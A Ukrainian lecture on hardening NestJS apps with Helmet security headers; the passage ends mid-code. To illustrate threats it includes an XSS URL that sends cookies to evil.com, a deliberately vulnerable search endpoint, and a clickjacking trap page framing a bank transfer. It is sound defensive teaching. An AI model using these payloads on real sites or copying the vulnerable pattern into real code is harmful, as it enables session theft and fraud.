# Захист через HTTP Security Headers (Helmet)

## Короткий зміст

У цій лекції розглядається захист веб-застосунків через налаштування HTTP security headers:

- **Helmet** — бібліотека для автоматичного додавання захисних HTTP заголовків, інтеграція через middleware у NestJS, набір з 15+ заголовків безпеки
- **Content Security Policy (CSP)** — контроль джерел завантаження ресурсів (scripts, styles, images), захист від XSS атак через обмеження inline scripts та eval()
- **X-Frame-Options** — захист від clickjacking атак через заборону вбудовування сторінки у iframe, значення DENY, SAMEORIGIN, ALLOW-FROM
- **Strict-Transport-Security (HSTS)** — примусове використання HTTPS, автоматичне перенаправлення всіх HTTP запитів на HTTPS, preload lists браузерів
- **X-Content-Type-Options** — заборона MIME-type sniffing, захист від виконання файлів з неправильним Content-Type
- **Referrer-Policy** — контроль передачі Referer header для захисту приватності користувачів, значення no-referrer, same-origin, strict-origin
- **Permissions-Policy** — контроль доступу до браузерних API (camera, microphone, geolocation, payment), заміна старого Feature-Policy
- **X-DNS-Prefetch-Control** — контроль DNS prefetching для мінімізації витоку інформації про відвідані сайти

Розглядаються налаштування для різних сценаріїв: SPA застосунки з CDN, SSR застосунки з inline styles, CSP reporting для моніторингу порушень політики безпеки.

---

::card-group

::card{title="🎯 Мета лекції" icon="i-lucide-target"}

- Опанувати налаштування HTTP security headers для захисту веб-застосунків від типових атак.
- Навчитися інтегрувати Helmet у NestJS проєкти для автоматичного додавання захисних заголовків.
- Зрозуміти призначення кожного security header та сценарії його застосування.
- Налаштувати Content Security Policy для захисту від XSS атак без порушення функціональності SPA.
- Впровадити HSTS для примусового використання HTTPS у продакшені.

::

::card{title="🔑 Ключові терміни" icon="i-lucide-key"}

- **Security Headers:** HTTP заголовки відповіді, що вказують браузеру правила безпеки для відображення та виконання контенту.
- **CSP (Content Security Policy):** політика, що визначає дозволені джерела завантаження ресурсів (scripts, styles, images, fonts).
- **HSTS (HTTP Strict Transport Security):** заголовок, що примушує браузер завжди використовувати HTTPS для домену.
- **Clickjacking:** атака, при якій зловмисник вбудовує легітимну сторінку у невидимий iframe для обману користувача.
- **MIME Sniffing:** спроба браузера визначити тип файлу за його вмістом, ігноруючи Content-Type header.

::

::

---

## HTTP Security Headers: Перша лінія захисту

У попередній лекції ми розглянули налаштування CORS для контролю доступу до API з різних origins. CORS захищає ваш backend від несанкціонованих запитів з інших доменів, але це лише один аспект безпеки веб-застосунків.

**HTTP Security Headers** — це заголовки відповіді сервера, що інструктують браузер про правила безпеки при відображенні та виконанні контенту вашої сторінки. Браузери поважають ці заголовки та застосовують відповідні обмеження для захисту користувача від атак на кшталт XSS (*Cross-Site Scripting*), clickjacking, MIME type confusion та витоку конфіденційної інформації.

### Чому важливі security headers?

Сучасні браузери мають вбудовані механізми захисту, але **за замовчуванням вони не активовані у найсуворішому режимі**. Причина — зворотна сумісність (*backward compatibility*) із старими сайтами, що покладаються на небезпечні практики (inline scripts, eval(), відсутність HTTPS).

**Security headers дозволяють серверу явно вказати:**

- Які домени можуть завантажувати scripts, styles та інші ресурси (CSP).
- Чи можна вбудовувати вашу сторінку в iframe (X-Frame-Options).
- Чи повинен браузер завжди використовувати HTTPS (HSTS).
- Чи може браузер "вгадувати" тип файлу, ігноруючи Content-Type (X-Content-Type-Options).
- Які дані передавати у Referer header при переходах на інші сайти (Referrer-Policy).

::note
**Ключова відмінність від CORS:** CORS контролює, які **інші сайти** можуть робити запити до вашого API. Security headers контролюють, що **ваша власна сторінка** може робити у браузері користувача (завантажувати scripts, відкривати камеру, використовувати geolocation).
::

### Типові вразливості, які закриваються security headers

| Атака | Security Header | Механізм захисту |
|-------|-----------------|------------------|
| **XSS (Cross-Site Scripting)** | Content-Security-Policy | Блокує виконання inline scripts та `eval()` |
| **Clickjacking** | X-Frame-Options, CSP frame-ancestors | Забороняє вбудовування у iframe |
| **MITM (Man-in-the-Middle)** | Strict-Transport-Security (HSTS) | Примушує використання HTTPS |
| **MIME Confusion Attack** | X-Content-Type-Options | Забороняє sniffing типу файлу |
| **Privacy Leakage** | Referrer-Policy | Обмежує передачу Referer header |
| **Несанкціонований доступ до API** | Permissions-Policy | Блокує camera, microphone, geolocation |

---

## Helmet: Автоматизація security headers у NestJS

**Helmet** — це middleware для Node.js, що автоматично додає набір захисних HTTP заголовків до всіх відповідей сервера. Це стандартний інструмент для Express.js та NestJS застосунків.

### Встановлення Helmet

::tabs
::tabs-item{label="npm"}
```bash
npm install --save helmet
```
::
::tabs-item{label="pnpm"}
```bash
pnpm add helmet
```
::
::tabs-item{label="yarn"}
```bash
yarn add helmet
```
::
::

### Базова інтеграція у NestJS

Helmet підключається як глобальний middleware у файлі `main.ts`:

```typescript
// src/main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Увімкнути всі security headers з конфігурацією за замовчуванням
  app.use(helmet());

  await app.listen(3000);
}
bootstrap();
```

**Що робить `helmet()` за замовчуванням:**

Helmet активує наступні middleware (кожен відповідає за окремий заголовок):

1. **Content-Security-Policy** — обмеження джерел завантаження ресурсів
2. **Cross-Origin-Embedder-Policy** — ізоляція cross-origin ресурсів
3. **Cross-Origin-Opener-Policy** — захист від leak-атак через `window.opener`
4. **Cross-Origin-Resource-Policy** — контроль завантаження ресурсів іншими origins
5. **Origin-Agent-Cluster** — ізоляція документів за origin
6. **Referrer-Policy** — контроль передачі Referer header
7. **Strict-Transport-Security** — примусове використання HTTPS
8. **X-Content-Type-Options** — заборона MIME sniffing
9. **X-DNS-Prefetch-Control** — контроль DNS prefetching
10. **X-Download-Options** — заборона відкриття файлів у контексті сайту (IE8+)
11. **X-Frame-Options** — захист від clickjacking
12. **X-Permitted-Cross-Domain-Policies** — контроль політик Adobe Flash/PDF
13. **X-Powered-By** — видалення заголовку (приховування технології)
14. **X-XSS-Protection** — застаріла захист від XSS (більше не рекомендується, CSP краще)

::tip
**Порада для розробки:** під час локальної розробки деякі заголовки (особливо CSP) можуть блокувати Hot Module Replacement (HMR) у Vite/Webpack. Використовуйте умовне підключення Helmet лише для продакшену або налаштуйте CSP для дозволу `localhost`.
::

---

## Content Security Policy (CSP): Захист від XSS

**Content Security Policy (CSP)** — це найпотужніший та найскладніший security header, що визначає **whitelist джерел**, з яких браузер може завантажувати ресурси.

### Проблема: XSS атаки

**XSS (Cross-Site Scripting)** — це атака, при якій зловмисник впроваджує зловмисний JavaScript код на вашу сторінку. Це можливо, якщо ваш додаток виводить некоректно відфільтровані дані користувача:

**Приклад вразливого коду:**

```typescript
// ❌ НЕБЕЗПЕЧНО: виведення некерованого HTML
@Get('search')
search(@Query('q') query: string) {
  // Якщо query = "<script>alert('XSS')</script>"
  return `<h1>Результати для: ${query}</h1>`; // Виконається script!
}
```

**Якщо користувач відкриє URL:**

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

…то зловмисник викраде cookies користувача.

### Як CSP захищає від XSS?

CSP дозволяє **заборонити виконання inline scripts** та **обмежити джерела завантаження**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**Що означає ця політика:**

- `default-src 'self'` — за замовчуванням завантажувати ресурси лише з поточного домену.
- `script-src 'self' https://cdn.example.com` — JavaScript можна завантажувати лише з поточного домену та `https://cdn.example.com`.

**Результат:** навіть якщо зловмисник впровадить `<script>alert('XSS')</script>`, браузер **не виконає** цей код, оскільки він не походить із дозволеного джерела.

### Директиви CSP

CSP складається з **директив**, кожна з яких контролює окремий тип ресурсів:

| Директива | Контролює |
|-----------|-----------|
| `default-src` | Базове правило для всіх ресурсів (якщо інше не вказано) |
| `script-src` | Завантаження та виконання JavaScript |
| `style-src` | Завантаження CSS файлів та `<style>` тегів |
| `img-src` | Завантаження зображень (`<img>`, CSS `background-image`) |
| `font-src` | Завантаження шрифтів (`@font-face`) |
| `connect-src` | AJAX, fetch, WebSocket, EventSource |
| `media-src` | `<audio>`, `<video>` теги |
| `object-src` | `<object>`, `<embed>`, `<applet>` (застаріле) |
| `frame-src` | `<iframe>` джерела |
| `frame-ancestors` | Дозволені батьківські сторінки для вбудовування (аналог X-Frame-Options) |
| `base-uri` | Дозволені значення `<base href>` |
| `form-action` | Дозволені URL для відправки форм |

**Значення джерел:**

| Значення | Опис |
|----------|------|
| `'self'` | Поточний домен (same-origin) |
| `'none'` | Повна заборона |
| `https://example.com` | Конкретний домен |
| `https:` | Будь-який HTTPS ресурс |
| `'unsafe-inline'` | Дозволити inline scripts/styles (небезпечно!) |
| `'unsafe-eval'` | Дозволити `eval()`, `new Function()` (небезпечно!) |
| `'nonce-abc123'` | Дозволити inline script з атрибутом `nonce="abc123"` |
| `'sha256-xyz...'` | Дозволити inline script з певним SHA-256 хешем |

### Приклад конфігурації CSP для SPA

Single Page Application (React/Vue/Angular) з CDN для статичних ресурсів:

```typescript
// src/main.ts
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"], // Базово — лише поточний домен
      scriptSrc: [
        "'self'",
        "https://cdn.jsdelivr.net",  // CDN для бібліотек
        "https://cdn.example.com",   // Ваш CDN для frontend assets
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'", // ⚠️ Потрібно для styled-components, CSS-in-JS
        "https://fonts.googleapis.com",
      ],
      imgSrc: [
        "'self'",
        "data:",              // Base64 encoded images
        "https:",             // Будь-які HTTPS зображення
      ],
      fontSrc: [
        "'self'",
        "https://fonts.gstatic.com",
      ],
      connectSrc: [
        "'self'",
        "https://api.example.com",    // Ваш API
        "wss://realtime.example.com", // WebSocket сервер
      ],
      frameAncestors: ["'none'"], // Заборона вбудовування у iframe
      objectSrc: ["'none'"],      // Заборона Flash та інших плагінів
      upgradeInsecureRequests: [], // Автоматично оновлювати HTTP → HTTPS
    },
  })
);
```

::warning
**Увага з `'unsafe-inline'` для `scriptSrc`:** це відкриває можливість для XSS атак! Використовуйте лише для `styleSrc` (для CSS-in-JS бібліотек) або замініть на `nonce`/`hash` базовані підходи.
::

### CSP для SSR застосунків (Next.js, Nuxt)

Server-Side Rendered застосунки генерують HTML на сервері та часто вставляють inline scripts для гідратації (*hydration*):

```typescript
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'nonce-GENERATED_NONCE'", // Динамічний nonce для кожного запиту
      ],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
    },
  })
);
```

**Генерація nonce для кожного запиту:**

```typescript
// src/middleware/csp.middleware.ts
import { Injectable, NestMiddleware } from '@nestjs/common';
import { Request, Response, NextFunction } from 'express';
import crypto from 'crypto';

@Injectable()
export class CspMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction) {
    // Генеруємо унікальний nonce для цього запиту
    const nonce = crypto.randomBytes(16).toString('base64');
    
    // Зберігаємо у res.locals для використання у шаблонах
    res.locals.cspNonce = nonce;

    // Встановлюємо CSP header з цим nonce
    res.setHeader(
      'Content-Security-Policy',
      `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'`
    );

    next();
  }
}
```

**Використання nonce у HTML шаблоні:**

```html
<!-- Браузер дозволить виконання лише scripts з правильним nonce -->
<script nonce="<%= cspNonce %>">
  window.__INITIAL_STATE__ = { user: { id: 123 } };
</script>
```

---

## X-Frame-Options: Захист від Clickjacking

**Clickjacking** — це атака, при якій зловмисник вбудовує вашу сторінку у невидимий `<iframe>` поверх фальшивої сторінки. Користувач думає, що натискає на кнопку зловмисника, але насправді натискає на елементи вашої справжньої сторінки.

### Приклад clickjacking атаки

**Зловмисник створює сторінку:**

```html
<!-- evil.com/trap.html -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.01; /* Майже невидимий */
    z-index: 9999;
  }
</style>

<h1>Виграй iPhone! Натисни тут 👇</h1>
<button>Отримати приз</button>

<!-- Ваша справжня сторінка -->
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
```

Користувач бачить кнопку "Отримати приз", але насправді натискає на невидиму кнопку "Підтвердити переказ" у iframe.

### Захист через X-Frame-Options

```typescript
// src/main.ts
app.use(
  helmet({
    frameguard: {
      action: 'deny', // Повна заборона iframe
    },
  })
);
```

**Значення X-Frame-Options:**

| Значення | Опис |
|----------|------|
| `DENY` | Повна заборона вбудовування у будь-який iframe |
| `SAMEORIGIN` | Дозволити лише iframe з того самого домену |
| `ALLOW-FROM https://trusted.com` | Дозволити iframe лише з певного домену (застаріло, не підтримується у Chrome) |

**Результат у HTTP заголовку:**

```http
X-Frame-Options: DENY
```

::note
**Сучасна альтернатива:** CSP директива `frame-ancestors` замінює X-Frame-Options і підтримує кілька доменів:

```typescript
helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'self'", "https://trusted.com"],
  },
});
```
::

### Коли дозволяти iframe?

**Сценарії, коли потрібен `SAMEORIGIN` або `frame-ancestors`:**

- Ваш сайт має **widget**, що вбудовується на інші сайти (наприклад, онлайн-чат, платіжна форма).
- Ви надаєте **OAuth/OpenID Connect login форму**, що відкривається у popup/iframe.
- У вас **багатодоменна архітектура** (наприклад, `admin.example.com` вбудовує iframe з `app.example.com`).

**Приклад для OAuth popup:**

```typescript
helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: [
      "'self'",
      "https://oauth.example.com", // Дозволити OAuth провайдеру
    ],
  },
});
```


---

## Strict-Transport-Security (HSTS): Примусове HTTPS

**HTTP Strict Transport Security (HSTS)** — це заголовок, що інструктує браузер **завжди** використовувати HTTPS для вашого домену, навіть якщо користувач вводить `http://` в адресному рядку.

### Проблема: Downgrade атаки

Навіть якщо ваш сервер налаштований на автоматичне перенаправлення HTTP → HTTPS, **перший запит** все одно йде через незахищений HTTP:

```
1. Користувач вводить: http://bank.com
2. Сервер відповідає: 301 Redirect → https://bank.com
3. Браузер відправляє запит на https://bank.com
```

**Проблема на кроці 1-2:** зловмисник у мережі (Man-in-the-Middle) може перехопити перший HTTP запит та підмінити відповідь сервера, перенаправивши користувача на фішинговий сайт або зберігши незашифрований трафік.

### Як працює HSTS?

При першому HTTPS запиті сервер відправляє заголовок:

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Після цього браузер:**

1. **Автоматично перетворює всі `http://` посилання на `https://`** протягом `max-age` секунд (1 рік у прикладі).
2. **Блокує будь-які спроби доступу через HTTP** — навіть якщо користувач вручну введе `http://`.
3. **Застосовує політику до всіх піддоменів** (якщо вказано `includeSubDomains`).

**Результат:** після першого візиту браузер **ніколи** не відправить незашифрований запит до вашого домену.

### Конфігурація HSTS у Helmet

```typescript
// src/main.ts
app.use(
  helmet({
    hsts: {
      maxAge: 31536000,        // 1 рік (у секундах)
      includeSubDomains: true, // Застосувати до всіх піддоменів
      preload: true,           // Додати до HSTS Preload List
    },
  })
);
```

**Параметри:**

- **`maxAge`** — час (у секундах), протягом якого браузер запам'ятає політику HSTS.
- **`includeSubDomains`** — застосувати HSTS до всіх піддоменів (наприклад, `api.example.com`, `cdn.example.com`).
- **`preload`** — дозволити включення домену до вбудованого списку HSTS у браузерах (HSTS Preload List).

::warning
**Увага:** HSTS можна увімкнути **лише на продакшені з валідним HTTPS сертифікатом**! Якщо ви увімкнете HSTS у локальній розробці через `http://localhost`, браузер заблокує доступ до сайту після першого візиту.
::

### HSTS Preload List: Захист з першого візиту

**Проблема:** HSTS працює лише **після першого HTTPS візиту**. Якщо користувач ніколи не відвідував ваш сайт через HTTPS, він вразливий до downgrade атаки.

**Рішення:** **HSTS Preload List** — це список доменів, вбудований безпосередньо у браузери (Chrome, Firefox, Safari, Edge). Для цих доменів браузер **ніколи** не відправить HTTP запит, навіть при першому візиті.

**Як додати домен до Preload List:**

1. Налаштуйте HSTS з параметрами:
   ```typescript
   hsts: {
     maxAge: 31536000,        // Мінімум 1 рік
     includeSubDomains: true, // Обов'язково
     preload: true,           // Обов'язково
   }
   ```

2. Перевірте, що ваш сайт відповідає вимогам на [hstspreload.org](https://hstspreload.org/).

3. Подайте запит на включення домену до списку.

**Після затвердження (займає 2-3 місяці):** всі браузери автоматично використовуватимуть HTTPS для вашого домену, навіть для користувачів, які ніколи його не відвідували.

::caution
**Видалення з Preload List — складний процес!** Якщо ви додали домен до списку, але згодом вирішили відключити HTTPS, видалення може зайняти **місяці**. Використовуйте preload лише для доменів, де HTTPS є **постійною вимогою**.
::

### Умовне увімкнення HSTS

Для локальної розробки та staging середовища HSTS слід вимкнути:

```typescript
// src/main.ts
const isProduction = process.env.NODE_ENV === 'production';

app.use(
  helmet({
    hsts: isProduction
      ? {
          maxAge: 31536000,
          includeSubDomains: true,
          preload: true,
        }
      : false, // Вимкнути HSTS у dev/staging
  })
);
```

---

## X-Content-Type-Options: Заборона MIME Sniffing

Браузери іноді намагаються "вгадати" тип файлу за його вмістом, ігноруючи заголовок `Content-Type`, надісланий сервером. Це називається **MIME type sniffing** і може призвести до **MIME confusion атак**.

### Приклад MIME confusion атаки

**Сценарій:**

1. Зловмисник завантажує файл `avatar.jpg` на ваш сервер (через форму завантаження аватара).
2. Файл насправді містить JavaScript код, але має розширення `.jpg`:
   ```javascript
   // avatar.jpg
   alert('XSS attack!');
   ```

3. Сервер віддає файл з правильним Content-Type:
   ```http
   Content-Type: image/jpeg
   ```

4. Але старий Internet Explorer **ігнорує** Content-Type, аналізує вміст файлу, виявляє JavaScript та **виконує його як script**!

### Захист через X-Content-Type-Options

Заголовок `X-Content-Type-Options: nosniff` інструктує браузер **суворо дотримуватися** Content-Type:

```typescript
// src/main.ts
app.use(
  helmet({
    noSniff: true, // За замовчуванням увімкнено у helmet()
  })
);
```

**Результат у HTTP відповіді:**

```http
X-Content-Type-Options: nosniff
```

**Що це означає:**

- Якщо файл має `Content-Type: image/jpeg`, браузер **не виконає його як script**, навіть якщо вміст виглядає як JavaScript.
- Якщо файл має `Content-Type: text/html`, браузер **не відобразить його як CSS**, навіть якщо він завантажений через `<link rel="stylesheet">`.

::tip
**Завжди увімкнюйте `noSniff`!** Це простий заголовок без побічних ефектів, що закриває цілий клас вразливостей.
::

---

## Referrer-Policy: Контроль витоку інформації

Коли користувач переходить з вашої сторінки на інший сайт (наприклад, натискаючи зовнішнє посилання), браузер за замовчуванням відправляє заголовок `Referer` з URL поточної сторінки.

### Проблема: Витік конфіденційної інформації

**Приклад:**

Користувач переглядає сторінку:
```
https://medical.com/patients/12345/diagnosis?disease=diabetes
```

Потім натискає зовнішнє посилання на `https://pharmacy.com`. Браузер відправляє:

```http
Referer: https://medical.com/patients/12345/diagnosis?disease=diabetes
```

**Проблема:** зовнішній сайт отримує конфіденційну інформацію з URL (ID пацієнта, діагноз).

### Контроль через Referrer-Policy

```typescript
// src/main.ts
app.use(
  helmet({
    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin',
    },
  })
);
```

**Доступні політики:**

| Політика | Опис | Приклад |
|----------|------|---------|
| `no-referrer` | Ніколи не відправляти Referer | Не передається |
| `no-referrer-when-downgrade` | Не відправляти при переході HTTPS → HTTP | `https://example.com` (лише при HTTPS → HTTPS) |
| `same-origin` | Відправляти лише для same-origin запитів | `https://example.com/page` (лише для example.com) |
| `origin` | Відправляти лише origin без шляху | `https://example.com` |
| `strict-origin` | `origin`, але не при HTTPS → HTTP | `https://example.com` |
| `origin-when-cross-origin` | Повний URL для same-origin, лише origin для cross-origin | Same: `https://example.com/patients/123`<br/>Cross: `https://example.com` |
| `strict-origin-when-cross-origin` (рекомендовано) | Комбінація `strict-origin` + `origin-when-cross-origin` | Same: повний URL<br/>Cross: лише origin<br/>HTTPS→HTTP: нічого |
| `unsafe-url` | Завжди відправляти повний URL (небезпечно!) | `https://example.com/patients/123` |

**Рекомендована політика для більшості застосунків:**

```typescript
referrerPolicy: {
  policy: 'strict-origin-when-cross-origin',
}
```

**Що це означає:**

- **Same-origin запити:** відправляти повний URL (наприклад, перехід між сторінками вашого сайту).
- **Cross-origin запити (HTTPS → HTTPS):** відправляти лише origin (`https://example.com`), без шляху та query parameters.
- **Cross-origin запити (HTTPS → HTTP):** не відправляти Referer взагалі (захист від downgrade атак).

### Коли використовувати `no-referrer`?

Для максимальної приватності (медичні сервіси, фінансові застосунки):

```typescript
referrerPolicy: {
  policy: 'no-referrer',
}
```

**Недолік:** деякі зовнішні сервіси (аналітика, платіжні системи) можуть покладатися на Referer для визначення джерела трафіку.

---

## Permissions-Policy: Контроль браузерних API

**Permissions Policy** (раніше Feature Policy) дозволяє контролювати доступ до потужних браузерних API: камера, мікрофон, геолокація, payment API, fullscreen, autoplay.

### Чому це важливо?

Без явної політики будь-який `<iframe>` на вашій сторінці може **запросити доступ** до камери або мікрофона користувача. Зловмисний рекламний iframe може використати це для шпигунства.

### Конфігурація Permissions Policy

```typescript
// src/main.ts
app.use(
  helmet({
    permissionsPolicy: {
      features: {
        camera: ["'none'"],        // Повна заборона камери
        microphone: ["'none'"],    // Повна заборона мікрофона
        geolocation: ["'self'"],   // Дозволити лише для поточного origin
        payment: ["'self'", "https://trusted-payment.com"], // Whitelist для payment API
        fullscreen: ["'self'"],    // Fullscreen лише для поточного origin
        syncXhr: ["'none'"],       // Заборона синхронних XHR (deprecated API)
      },
    },
  })
);
```

**Результат у HTTP заголовку:**

```http
Permissions-Policy: camera=(), microphone=(), geolocation=(self), payment=(self "https://trusted-payment.com"), fullscreen=(self), sync-xhr=()
```

**Значення:**

- `()` — повна заборона (еквівалент `'none'`)
- `(self)` — дозволити лише для поточного origin
- `(self "https://trusted.com")` — whitelist origins

### Типові API для контролю

| Feature | Опис | Рекомендація |
|---------|------|--------------|
| `camera` | Доступ до камери через getUserMedia | `'none'` (якщо не потрібно) |
| `microphone` | Доступ до мікрофона | `'none'` (якщо не потрібно) |
| `geolocation` | Геолокація користувача | `'self'` або `'none'` |
| `payment` | Payment Request API | `'self'` + whitelist платіжних провайдерів |
| `usb` | Доступ до USB пристроїв | `'none'` (якщо не Web USB застосунок) |
| `autoplay` | Автоматичне відтворення відео/аудіо | `'self'` |
| `fullscreen` | Fullscreen API | `'self'` |
| `picture-in-picture` | Picture-in-Picture для відео | `'self'` або `'none'` |
| `accelerometer` | Доступ до акселерометра | `'self'` або `'none'` |
| `gyroscope` | Доступ до гіроскопа | `'self'` або `'none'` |

### Приклад для відеоконференцій

Якщо ваш застосунок використовує WebRTC для відеодзвінків:

```typescript
permissionsPolicy: {
  features: {
    camera: ["'self'"],              // Дозволити камеру для поточного origin
    microphone: ["'self'"],          // Дозволити мікрофон
    displayCapture: ["'self'"],      // Screen sharing
    geolocation: ["'none'"],         // Не потрібна геолокація
    payment: ["'none'"],             // Не потрібні платежі
  },
}
```

::warning
**Увага:** якщо ваш сайт вбудовує iframe з іншого домену (наприклад, YouTube відео), і цей iframe потребує доступу до fullscreen, додайте його до whitelist:

```typescript
fullscreen: ["'self'", "https://www.youtube.com"],
```
::

---

## X-DNS-Prefetch-Control: Мінімізація витоку інформації

Браузери за замовчуванням виконують **DNS prefetching** — попереднє розв'язання DNS для посилань на сторінці, щоб прискорити майбутні переходи.

### Проблема приватності

Коли браузер виконує DNS prefetch для `https://evil.com`, DNS сервер дізнається, що користувач **переглядає сторінку з посиланням на evil.com**, навіть якщо користувач не натискав це посилання.

### Вимкнення DNS prefetch

```typescript
// src/main.ts
app.use(
  helmet({
    dnsPrefetchControl: {
      allow: false, // Вимкнути DNS prefetch
    },
  })
);
```

**Результат:**

```http
X-DNS-Prefetch-Control: off
```

**Коли це потрібно:**

- Застосунки з високими вимогами до приватності (медичні, юридичні сервіси).
- Сторінки з посиланнями на конфіденційні ресурси.

**Недолік:** незначне сповільнення переходів за зовнішніми посиланнями (користувач чекає розв'язання DNS після натискання).

---

## Повна конфігурація Helmet для продакшену

Ось приклад комплексної конфігурації для NestJS застосунку у продакшені:

```typescript
// src/config/helmet.config.ts
import { HelmetOptions } from 'helmet';

export const helmetConfig: HelmetOptions = {
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "https://cdn.jsdelivr.net",
        "https://cdn.example.com",
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'", // Для CSS-in-JS (React styled-components)
        "https://fonts.googleapis.com",
      ],
      imgSrc: ["'self'", "data:", "https:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: [
        "'self'",
        "https://api.example.com",
        "wss://realtime.example.com",
      ],
      frameAncestors: ["'none'"], // Заборона iframe
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },

  // HTTP Strict Transport Security
  hsts: {
    maxAge: 31536000,        // 1 рік
    includeSubDomains: true,
    preload: true,
  },

  // Clickjacking protection
  frameguard: {
    action: 'deny',
  },

  // MIME sniffing protection
  noSniff: true,

  // Referrer policy
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin',
  },

  // Permissions policy
  permissionsPolicy: {
    features: {
      camera: ["'none'"],
      microphone: ["'none'"],
      geolocation: ["'self'"],
      payment: ["'self'"],
      usb: ["'none'"],
      fullscreen: ["'self'"],
    },
  },

  // DNS prefetch control
  dnsPrefetchControl: {
    allow: false,
  },

  // Видалити X-Powered-By header
  hidePoweredBy: true,

  // Cross-Origin policies
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-origin' },
};
```

**Використання у `main.ts`:**

```typescript
// src/main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import helmet from 'helmet';
import { helmetConfig } from './config/helmet.config';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Умовне увімкнення для продакшену
  if (process.env.NODE_ENV === 'production') {
    app.use(helmet(helmetConfig));
  } else {
    // У розробці — м'якіші обмеження
    app.use(
      helmet({
        contentSecurityPolicy: false, // Вимкнути CSP (для HMR)
        hsts: false,                  // Вимкнути HSTS (немає HTTPS)
      })
    );
  }

  await app.listen(3000);
}
bootstrap();
```


---

## Тестування та діагностика Security Headers

### Перевірка заголовків через DevTools

**Крок 1:** Відкрийте Chrome DevTools (F12) → **Network** tab

**Крок 2:** Перезавантажте сторінку та виберіть будь-який запит (зазвичай перший HTML документ)

**Крок 3:** Перегляньте вкладку **Headers** → **Response Headers**

**Приклад правильно налаштованих заголовків:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

::tip
**Швидка перевірка:** використовуйте онлайн-інструменти для аналізу security headers:

- [securityheaders.com](https://securityheaders.com) — комплексний аналіз з оцінкою A+ до F
- [Mozilla Observatory](https://observatory.mozilla.org) — детальний звіт про вразливості
- [hardenize.com](https://www.hardenize.com) — аналіз TLS та security headers
::

### Перевірка CSP через консоль

Якщо CSP блокує ресурс, браузер виведе помилку у Console:

```
Refused to load the script 'https://evil.com/malware.js' 
because it violates the following Content Security Policy directive: 
"script-src 'self' https://cdn.example.com"
```

**Що робити:**

1. Перевірте, чи ресурс **легітимний** (це ваш CDN чи зовнішня бібліотека).
2. Якщо так — додайте домен до відповідної CSP директиви.
3. Якщо ні — це потенційна XSS атака, залиште блокування активним.

### CSP Report-Only режим

Для тестування CSP без блокування ресурсів використовуйте **report-only** режим:

```typescript
// src/main.ts
app.use(
  helmet.contentSecurityPolicy({
    reportOnly: true, // Лише логувати порушення, не блокувати
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.example.com"],
      reportUri: '/api/csp-report', // Endpoint для отримання звітів
    },
  })
);
```

**Результат:**

```http
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self' https://cdn.example.com; report-uri /api/csp-report
```

Браузер **не блокуватиме** порушення, але відправлятиме звіти на `/api/csp-report`:

```typescript
// src/csp/csp-report.controller.ts
import { Controller, Post, Body, Logger } from '@nestjs/common';

@Controller('api/csp-report')
export class CspReportController {
  private logger = new Logger('CSP');

  @Post()
  handleReport(@Body() report: any) {
    this.logger.warn('CSP violation detected:', JSON.stringify(report, null, 2));
    
    // Зберегти у базу даних або надіслати до Sentry
    // await this.monitoringService.logCspViolation(report);

    return { received: true };
  }
}
```

**Приклад звіту від браузера:**

```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self' https://cdn.example.com",
    "blocked-uri": "https://malicious.com/evil.js",
    "source-file": "https://example.com/page",
    "line-number": 42,
    "column-number": 15
  }
}
```

### Поетапне впровадження CSP

**Фаза 1: Report-Only (1-2 тижні)**

Увімкніть CSP у report-only режимі для збору реальних даних про порушення:

```typescript
contentSecurityPolicy: {
  reportOnly: true,
  directives: { /* ваша політика */ },
}
```

Аналізуйте звіти, щоб виявити:
- Легітимні ресурси, які потрібно додати до whitelist.
- Зловмисні скрипти (якщо є).
- Застарілі практики у вашому коді (inline scripts).

**Фаза 2: Enforce з винятками (1-2 тижні)**

Увімкніть CSP у enforce режимі, але додайте `'unsafe-inline'` для критичних сценаріїв:

```typescript
contentSecurityPolicy: {
  reportOnly: false,
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://cdn.example.com", "'unsafe-inline'"], // Тимчасово
  },
}
```

**Фаза 3: Повне enforce (постійно)**

Видаліть `'unsafe-inline'` та замініть inline scripts на nonce або hash:

```typescript
contentSecurityPolicy: {
